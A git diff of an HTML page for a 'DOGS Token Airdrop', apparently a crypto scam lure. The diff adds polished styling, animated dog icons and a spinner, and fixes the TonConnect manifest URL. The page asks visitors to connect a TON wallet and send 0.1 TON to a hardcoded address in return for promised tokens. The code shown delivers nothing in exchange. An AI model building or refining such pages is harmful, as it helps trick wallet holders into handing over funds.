@@ -4,20 +4,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DOGS Token Airdrop</title>
+    <title>🐕 DOGS Token Airdrop 🐕</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <!-- Dodajemy Font Awesome dla dodatkowych ikon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             max-width: 800px;
             margin: 0 auto;
             padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
         }
+
         .container {
             text-align: center;
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
         }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .dog-icon {
+            animation: bounce 2s infinite;
+            display: inline-block;
+            margin: 0 10px;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .title {
+            font-size: 2.5em;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .description {
+            font-size: 1.2em;
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
         .button {
-            background-color: #4CAF50;
+            background: linear-gradient(45deg, #2ecc71, #27ae60);
             border: none;
             color: white;
             padding: 15px 32px;
@@ -27,22 +70,103 @@
             font-size: 16px;
             margin: 4px 2px;
             cursor: pointer;
-            border-radius: 4px;
+            border-radius: 25px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.2);
         }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.3);
+        }
+
+        .button:active {
+            transform: translateY(1px);
+        }
+
         #status {
             margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
+            padding: 15px;
+            border-radius: 10px;
+            background-color: #f8f9fa;
+            border-left: 4px solid #2ecc71;
+        }
+
+        .token-info {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .info-box {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            min-width: 150px;
+        }
+
+        .info-box i {
+            color: #2ecc71;
+            margin-right: 5px;
+        }
+
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .loading i {
+            animation: spin 1s infinite linear;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <h1>DOGS Token Airdrop</h1>
-        <p>Send 0.1 TON to receive 100 DOGS tokens</p>
+        <div class="logo">
+            <span class="dog-icon">🐕</span>
+            <span class="dog-icon">🦮</span>
+            <span class="dog-icon">🐕‍🦺</span>
+        </div>
+        
+        <h1 class="title">
+            <i class="fas fa-paw"></i>
+            DOGS Token Airdrop
+            <i class="fas fa-paw"></i>
+        </h1>
+
+        <p class="description">
+            <i class="fas fa-gift"></i> Send 0.1 TON to receive 100 DOGS tokens
+            <br>
+            <small>Join our community of happy DOGS token holders!</small>
+        </p>
+
+        <div class="token-info">
+            <div class="info-box">
+                <i class="fas fa-coins"></i>
+                <span>Required: 0.1 TON</span>
+            </div>
+            <div class="info-box">
+                <i class="fas fa-arrow-right"></i>
+                <span>Receive: 100 DOGS</span>
+            </div>
+        </div>
+
         <div id="ton-connect"></div>
-        <button id="claim-button" class="button" style="display: none;">Claim 100 DOGS</button>
+        
+        <button id="claim-button" class="button" style="display: none;">
+            <i class="fas fa-bone"></i> Claim 100 DOGS
+        </button>
+
+        <div class="loading">
+            <i class="fas fa-spinner"></i> Processing...
+        </div>
+
         <div id="status"></div>
     </div>
 
@@ -50,21 +174,24 @@
         const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
 
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk',
+            manifestUrl: 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
 
         const claimButton = document.getElementById('claim-button');
         const statusDiv = document.getElementById('status');
+        const loadingDiv = document.querySelector('.loading');
 
         // Obsługa zmiany statusu połączenia
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
                 claimButton.style.display = 'inline-block';
-                statusDiv.textContent = 'Connected: ' + wallet.account.address;
+                statusDiv.innerHTML = `<i class="fas fa-check-circle"></i> Connected: ${wallet.account.address}`;
+                statusDiv.style.borderLeft = '4px solid #2ecc71';
             } else {
                 claimButton.style.display = 'none';
-                statusDiv.textContent = 'Please connect your wallet';
+                statusDiv.innerHTML = '<i class="fas fa-info-circle"></i> Please connect your wallet';
+                statusDiv.style.borderLeft = '4px solid #3498db';
             }
         });
 
@@ -72,9 +199,13 @@
         claimButton.addEventListener('click', async () => {
             try {
                 if (!tonConnectUI.connected) {
-                    statusDiv.textContent = 'Please connect your wallet first';
+                    statusDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please connect your wallet first';
+                    statusDiv.style.borderLeft = '4px solid #e74c3c';
                     return;
                 }
+
+                loadingDiv.style.display = 'block';
+                claimButton.disabled = true;
 
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 60,
@@ -87,21 +218,34 @@
                     ]
                 };
 
-                statusDiv.textContent = 'Confirming transaction...';
+                statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming transaction...';
+                statusDiv.style.borderLeft = '4px solid #f1c40f';
 
                 const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction result:', result);
                 
-                statusDiv.textContent = 'Transaction sent! Waiting for confirmation...';
-                
-                // Możesz dodać tu kod do śledzenia statusu transakcji
+                statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Transaction sent! Waiting for confirmation...';
+                statusDiv.style.borderLeft = '4px solid #2ecc71';
 
             } catch (error) {
                 console.error('Transaction error:', error);
-                statusDiv.textContent = 'Error: ' + (error.message || 'Unknown error occurred');
+                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: ${error.message || 'Unknown error occurred'}`;
+                statusDiv.style.borderLeft = '4px solid #e74c3c';
+            } finally {
+                loadingDiv.style.display = 'none';
+                claimButton.disabled = false;
             }
         });
 
+        // Dodanie efektu hover dla ikon piesków
+        document.querySelectorAll('.dog-icon').forEach(icon => {
+            icon.addEventListener('mouseover', () => {
+                icon.style.transform = 'scale(1.2)';
+            });
+            icon.addEventListener('mouseout', () => {
+                icon.style.transform = 'scale(1)';
+            });
+        });
     </script>
 </body>
 
